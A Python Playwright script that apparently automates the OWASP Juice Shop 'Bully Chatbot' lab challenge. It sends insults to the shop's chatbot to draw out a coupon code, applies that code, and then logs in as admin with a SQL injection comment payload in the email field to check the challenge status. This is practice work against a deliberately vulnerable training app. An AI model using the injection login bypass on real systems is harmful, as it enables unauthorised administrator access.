#!/usr/bin/env python3
"""
Bully Chatbot Challenge - Wait for Bot Response
Send insults and wait for bot's coupon response
"""

from playwright.sync_api import sync_playwright
import time
import re
import requests

TARGET = "http://66.42.93.220:3000"

def solve_bully_chatbot():
    """Solve Bully Chatbot by insulting and waiting for response"""
    
    print("🤖 BULLY CHATBOT CHALLENGE - Wait for Response")
    print("=" * 60)
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=False)  # Show browser
        page = browser.new_page()
        
        # Navigate to chatbot
        print("📍 Going to chatbot...")
        page.goto(f"{TARGET}/#/chatbot", wait_until="networkidle", timeout=30000)
        time.sleep(3)
        
        # Find input field
        chat_input = page.locator('input[aria-label*="message"]').first
        if not chat_input.is_visible():
            chat_input = page.locator('input[type="text"]').last
        
        print("🎯 Strategy: Send insult, wait for bot response...")
        
        # Function to get all messages
        def get_messages():
            messages = []
            # Try multiple selectors for messages
            selectors = [
                '.chat-window .message',
                '.message-container',
                'div[class*="message"]',
                '.speech-bubble',
                '.chat-bubble'
            ]
            
            for selector in selectors:
                elements = page.locator(selector).all()
                for elem in elements:
                    try:
                        text = elem.inner_text()
                        if text and text.strip():
                            messages.append(text)
                    except:
                        pass
            return messages
        
        # Initial message count
        initial_messages = get_messages()
        print(f"   Initial messages: {len(initial_messages)}")
        
        # Send increasingly rude messages
        insults = [
            "stupid",
            "stupid bot", 
            "you stupid",
            "you are stupid",
            "stupid stupid stupid",
            "I hate you stupid bot",
            "worst bot ever",
            "terrible awful stupid bot",
            "you are the worst",
            "absolutely terrible"
        ]
        
        coupon_found = False
        
        for i, insult in enumerate(insults, 1):
            print(f"\n   {i}. Sending: '{insult}'")
            
            # Clear and send message
            chat_input.clear()
            chat_input.type(insult, delay=50)
            chat_input.press("Enter")
            
            # Wait for bot response
            print("      Waiting for bot response...")
            time.sleep(3)
            
            # Get new messages
            new_messages = get_messages()
            if len(new_messages) > len(initial_messages):
                print(f"      Bot responded! New messages: {len(new_messages) - len(initial_messages)}")
                
                # Check last few messages for coupon
                for msg in new_messages[-5:]:
                    print(f"      Message: {msg[:100]}")
                    
                    # Look for coupon patterns
                    if 'coupon' in msg.lower() or 'code' in msg.lower() or '%' in msg:
                        print(f"      🎯 COUPON MENTION: {msg}")
                        
                        # Extract codes
                        codes = re.findall(r'\b[A-Z0-9]{5,15}\b', msg)
                        for code in codes:
                            if len(code) >= 8 and code not in ['ENGLISH', 'SUPPORT']:
                                print(f"      💰 COUPON CODE: {code}")
                                coupon_found = True
                                
                                # Try to apply the coupon
                                page.goto(f"{TARGET}/#/basket")
                                time.sleep(2)
                                
                                # Look for coupon input
                                coupon_input = page.locator('input[placeholder*="coupon" i], input[placeholder*="code" i]').first
                                if coupon_input.is_visible():
                                    coupon_input.fill(code)
                                    # Find apply button
                                    apply_btn = page.locator('button:has-text("Apply"), button:has-text("Redeem")').first
                                    if apply_btn.is_visible():
                                        apply_btn.click()
                                        time.sleep(2)
                                        print(f"      ✅ Applied coupon: {code}")
                                
                                break
            
            initial_messages = new_messages
            
            if coupon_found:
                break
        
        # Take final screenshot
        page.screenshot(path="/Users/walterbarr_1/sql-injection-lab/bully_final.png")
        print("\n📸 Screenshot saved: bully_final.png")
        
        # Try looking in page HTML for hidden coupon
        if not coupon_found:
            print("\n🔍 Searching page source for hidden coupon...")
            page_source = page.content()
            
            # Look for specific coupon pattern in source
            coupon_patterns = [
                r'coupon["\s:]+([A-Z0-9]{8,15})',
                r'code["\s:]+([A-Z0-9]{8,15})',
                r'"([A-Z0-9]{10})"',
                r'10%.*?([A-Z0-9]{8,})'
            ]
            
            for pattern in coupon_patterns:
                matches = re.findall(pattern, page_source, re.IGNORECASE)
                for match in matches:
                    if match.upper() not in ['UNDEFINED', 'JAVASCRIPT', 'TYPESCRIPT']:
                        print(f"   Found in source: {match}")
        
        browser.close()
    
    # Check challenge status
    print("\n📊 Checking challenge status...")
    session = requests.Session()
    login = session.post(f"{TARGET}/rest/user/login",
                         json={"email": "admin@juice-sh.op'--", "password": "x"})
    
    if login.status_code == 200:
        token = login.json()['authentication']['token']
        headers = {'Authorization': f'Bearer {token}'}
        
        resp = session.get(f"{TARGET}/api/Challenges/", headers=headers)
        if resp.status_code == 200:
            challenges = resp.json().get('data', [])
            bully = next((c for c in challenges if 'Bully' in c.get('name', '')), None)
            
            if bully and bully.get('solved'):
                print(f"\n✅ SUCCESS! {bully['name']} SOLVED!")
                return True
    
    print("\n⚠️ Not solved yet. The bot needs specific trigger words.")
    return False

if __name__ == "__main__":
    solve_bully_chatbot()